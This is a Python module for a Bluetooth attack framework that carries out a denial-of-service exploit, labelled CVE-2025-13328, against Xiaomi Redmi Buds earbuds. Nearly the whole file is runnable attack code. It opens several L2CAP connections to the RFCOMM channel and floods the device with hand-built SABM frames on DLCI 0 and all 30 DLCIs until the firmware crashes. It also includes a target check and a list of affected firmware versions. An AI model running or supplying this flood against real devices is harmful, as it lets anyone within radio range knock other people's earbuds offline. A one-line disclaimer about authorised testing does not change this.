"""
BlueSploit Module: Xiaomi Redmi Buds RFCOMM DLCI 0 Flood (CVE-2025-13328)
CWE-400 Uncontrolled Resource Consumption in Xiaomi Redmi Buds firmware

A resource exhaustion vulnerability in Xiaomi Redmi Buds firmware allows
an adjacent attacker to crash the device's Bluetooth firmware by flooding
RFCOMM DLCI 0 (the multiplexer control channel) with connection requests
faster than the firmware can process them. The firmware lacks proper rate
limiting and connection queue management, causing a firmware crash and DoS.

Author: v33ru
CVE: CVE-2025-13328
CWE: CWE-400 (Uncontrolled Resource Consumption)
"""

import struct
import time
import os
import threading
from core.base import (
    ExploitModule, ModuleInfo, ModuleOption,
    BTProtocol, Severity
)
from core.utils.printer import (
    print_success, print_error, print_info, print_warning, Colors
)

try:
    import bluetooth
    BLUETOOTH_AVAILABLE = True
except ImportError:
    BLUETOOTH_AVAILABLE = False

RFCOMM_PSM  = 0x0003
RFCOMM_SABM = 0x2F
RFCOMM_UA   = 0x63
RFCOMM_UIH  = 0xEF
RFCOMM_DM   = 0x0F

# Xiaomi Redmi Buds variants known to be vulnerable
AFFECTED_DEVICES = [
    "Xiaomi Redmi Buds 3 Pro (firmware < 3.2.1.4)",
    "Xiaomi Redmi Buds 4 (firmware < 4.0.0.8)",
    "Xiaomi Redmi Buds 4 Pro (firmware < 4.1.0.6)",
    "Xiaomi Redmi Buds 5 (firmware < 5.0.1.2)",
]


class Module(ExploitModule):
    """
    Xiaomi Redmi Buds RFCOMM DLCI 0 Flood DoS (CVE-2025-13328)

    Exploits missing rate limiting on the RFCOMM multiplexer control channel
    (DLCI 0) in Xiaomi Redmi Buds firmware. By rapidly sending SABM frames
    on DLCI 0 faster than the firmware's connection state machine can process
    them, the firmware's internal queue overflows, causing a firmware crash
    and Bluetooth disconnection.

    The firmware's RFCOMM handler allocates a small fixed-size buffer for
    pending mux setup requests. When this buffer overflows, the firmware
    enters an undefined state and crashes.

    Attack flow:
    1. Connect L2CAP to RFCOMM PSM on target earbuds
    2. Send SABM on DLCI 0 to start multiplexer setup
    3. Without waiting for UA, immediately flood with additional DLCI 0 SABMs
    4. Simultaneously open all 30 possible DLCIs
    5. Firmware queue overflows → crash → Bluetooth restart

    Impact: Firmware crash, audio interruption, forced Bluetooth restart
    Range: Bluetooth Classic range (~10m indoors, ~30m line of sight)
    """

    info = ModuleInfo(
        name="Xiaomi Redmi Buds RFCOMM DLCI 0 Flood",
        description=(
            "Firmware crash via RFCOMM DLCI 0 resource exhaustion "
            "on Xiaomi Redmi Buds (CVE-2025-13328)"
        ),
        author=["v33ru"],
        protocol=BTProtocol.CLASSIC,
        severity=Severity.MEDIUM,
        cve=["CVE-2025-13328"],
        references=[
            "https://nvd.nist.gov/vuln/detail/CVE-2025-13328",
        ],
    )

    def _setup_options(self) -> None:
        self.add_option(ModuleOption(
            name="target",
            required=True,
            description="Target Xiaomi Buds BD_ADDR (XX:XX:XX:XX:XX:XX)",
        ))
        self.add_option(ModuleOption(
            name="interface",
            required=False,
            description="Local HCI adapter",
            default="hci0",
        ))
        self.add_option(ModuleOption(
            name="flood_rate",
            required=False,
            description="SABM frames per second on DLCI 0",
            default=200,
        ))
        self.add_option(ModuleOption(
            name="duration",
            required=False,
            description="Flood duration in seconds",
            default=10,
        ))
        self.add_option(ModuleOption(
            name="dlci_all",
            required=False,
            description="Also flood all 30 DLCIs simultaneously",
            default=True,
        ))
        self.add_option(ModuleOption(
            name="connections",
            required=False,
            description="Concurrent L2CAP connections",
            default=3,
        ))

    def check(self) -> bool:
        if not BLUETOOTH_AVAILABLE:
            print_error("pybluez2 required — pip install pybluez2")
            return False
        target = self.get_option("target")
        if not self.validate_bd_addr(target):
            print_error(f"Invalid BD_ADDR: {target}")
            return False
        print_info(f"Probing {target} for RFCOMM PSM (Xiaomi Buds check)...")
        print_info(f"Affected devices:")
        for d in AFFECTED_DEVICES:
            print_info(f"  • {d}")
        try:
            s = bluetooth.BluetoothSocket(bluetooth.L2CAP)
            s.settimeout(5.0)
            s.connect((target, RFCOMM_PSM))
            s.close()
            print_success("RFCOMM PSM reachable — target may be vulnerable to CVE-2025-13328")
            return True
        except bluetooth.BluetoothError as e:
            print_error(f"Unreachable: {e}")
            return False

    def run(self) -> bool:
        if not BLUETOOTH_AVAILABLE:
            print_error("pybluez2 required — pip install pybluez2")
            return False
        if os.geteuid() != 0:
            print_error("Root privileges required")
            return False

        target     = self.get_option("target")
        flood_rate = int(self.get_option("flood_rate"))
        duration   = int(self.get_option("duration"))
        dlci_all   = self.get_option("dlci_all")
        n_conns    = int(self.get_option("connections"))

        if not self.validate_bd_addr(target):
            print_error(f"Invalid BD_ADDR: {target}")
            return False

        frame_delay = 1.0 / max(1, flood_rate)

        print_info(f"Target     : {target}")
        print_info(f"Flood rate : {flood_rate} SABM/s per connection")
        print_info(f"Duration   : {duration}s")
        print_info(f"Connections: {n_conns}")
        print_info(f"DLCI flood : {'all 30 DLCIs' if dlci_all else 'DLCI 0 only'}")
        print_info("─" * 50)
        print_warning("DISCLAIMER: For authorized security testing only!")

        stats = {"frames": 0, "errors": 0}
        stop = threading.Event()
        lock = threading.Lock()

        def flood_worker(tid: int) -> None:
            while not stop.is_set():
                try:
                    sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)
                    sock.settimeout(3.0)
                    sock.connect((target, RFCOMM_PSM))

                    # Rapid DLCI 0 SABM flood — no waiting for UA
                    flood_frames = 0
                    while not stop.is_set() and flood_frames < flood_rate:
                        sock.send(self._sabm(0))
                        flood_frames += 1
                        with lock:
                            stats["frames"] += 1

                        if dlci_all:
                            # Simultaneously open all DLCIs
                            for ch in range(1, 31):
                                if stop.is_set():
                                    break
                                dlci = ch << 1 | 1
                                try:
                                    sock.send(self._sabm(dlci))
                                    with lock:
                                        stats["frames"] += 1
                                except Exception:
                                    break

                        if frame_delay > 0:
                            time.sleep(frame_delay)

                    sock.close()

                except bluetooth.BluetoothError as e:
                    with lock:
                        stats["errors"] += 1
                    if "refused" in str(e).lower() or "not connected" in str(e).lower():
                        # Crash likely — target not responding
                        pass

        threads = [
            threading.Thread(target=flood_worker, args=(i,), daemon=True)
            for i in range(n_conns)
        ]
        for t in threads:
            t.start()

        start = time.time()
        print_info(f"Flooding {target} DLCI 0 ({duration}s)...")

        try:
            while time.time() - start < duration:
                elapsed = time.time() - start
                remaining = duration - elapsed
                rate = stats["frames"] / elapsed if elapsed > 0 else 0
                print(f"\r  Frames: {stats['frames']} | Errors: {stats['errors']} "
                      f"| Rate: {rate:.0f}/s | {remaining:.0f}s left    ",
                      end='', flush=True)
                time.sleep(0.5)

        except KeyboardInterrupt:
            print()
            print_warning("Interrupted")
        finally:
            stop.set()
            print()

        for t in threads:
            t.join(timeout=3.0)

        print_info("─" * 50)
        if stats["frames"] > 0:
            print_success(f"CVE-2025-13328: Sent {stats['frames']} RFCOMM SABM frames to {target}")
            if stats["errors"] > 5:
                print_success(f"High error rate ({stats['errors']}) — firmware may have crashed")
                print_success("Check if target Bluetooth is still discoverable")
            else:
                print_info("Low error rate — target may be patched or frame rate too low")
            self.add_result({
                "target": target,
                "frames_sent": stats["frames"],
                "errors": stats["errors"],
                "duration": duration,
                "cve": "CVE-2025-13328",
            })
            return True

        print_error("No frames sent — target unreachable")
        return False

    def _sabm(self, dlci: int) -> bytes:
        addr = (dlci << 2) | 0x03
        ctrl = RFCOMM_SABM | 0x10
        length = 0x01
        fcs = self._fcs(bytes([addr, ctrl, length]))
        return struct.pack("BBBB", addr, ctrl, length, fcs)

    @staticmethod
    def _fcs(data: bytes) -> int:
        table = [
            0x00,0x91,0xE3,0x72,0x07,0x96,0xE4,0x75,0x0E,0x9F,0xED,0x7C,0x09,0x98,0xEA,0x7B,
            0x1C,0x8D,0xFF,0x6E,0x1B,0x8A,0xF8,0x69,0x12,0x83,0xF1,0x60,0x15,0x84,0xF6,0x67,
            0x38,0xA9,0xDB,0x4A,0x3F,0xAE,0xDC,0x4D,0x36,0xA7,0xD5,0x44,0x31,0xA0,0xD2,0x43,
            0x24,0xB5,0xC7,0x56,0x23,0xB2,0xC0,0x51,0x2A,0xBB,0xC9,0x58,0x2D,0xBC,0xCE,0x5F,
            0x70,0xE1,0x93,0x02,0x77,0xE6,0x94,0x05,0x7E,0xEF,0x9D,0x0C,0x79,0xE8,0x9A,0x0B,
            0x6C,0xFD,0x8F,0x1E,0x6B,0xFA,0x88,0x19,0x62,0xF3,0x81,0x10,0x65,0xF4,0x86,0x17,
            0x48,0xD9,0xAB,0x3A,0x4F,0xDE,0xAC,0x3D,0x46,0xD7,0xA5,0x34,0x41,0xD0,0xA2,0x33,
            0x54,0xC5,0xB7,0x26,0x53,0xC2,0xB0,0x21,0x5A,0xCB,0xB9,0x28,0x5D,0xCC,0xBE,0x2F,
            0xE0,0x71,0x03,0x92,0xE7,0x76,0x04,0x95,0xEE,0x7F,0x0D,0x9C,0xE9,0x78,0x0A,0x9B,
            0xFC,0x6D,0x1F,0x8E,0xFB,0x6A,0x18,0x89,0xF2,0x63,0x11,0x80,0xF5,0x64,0x16,0x87,
            0xD8,0x49,0x3B,0xAA,0xDF,0x4E,0x3C,0xAD,0xD6,0x47,0x35,0xA4,0xD1,0x40,0x32,0xA3,
            0xC4,0x55,0x27,0xB6,0xC3,0x52,0x20,0xB1,0xCA,0x5B,0x29,0xB8,0xCD,0x5C,0x2E,0xBF,
            0x90,0x01,0x73,0xE2,0x97,0x06,0x74,0xE5,0x9E,0x0F,0x7D,0xEC,0x99,0x08,0x7A,0xEB,
            0x8C,0x1D,0x6F,0xFE,0x8B,0x1A,0x68,0xF9,0x82,0x13,0x61,0xF0,0x85,0x14,0x66,0xF7,
            0xA8,0x39,0x4B,0xDA,0xAF,0x3E,0x4C,0xDD,0xA6,0x37,0x45,0xD4,0xA1,0x30,0x42,0xD3,
            0xB4,0x25,0x57,0xC6,0xB3,0x22,0x50,0xC1,0xBA,0x2B,0x59,0xC8,0xBD,0x2C,0x5E,0xCF,
        ]
        fcs = 0xFF
        for b in data:
            fcs = table[fcs ^ b]
        return 0xFF - fcs
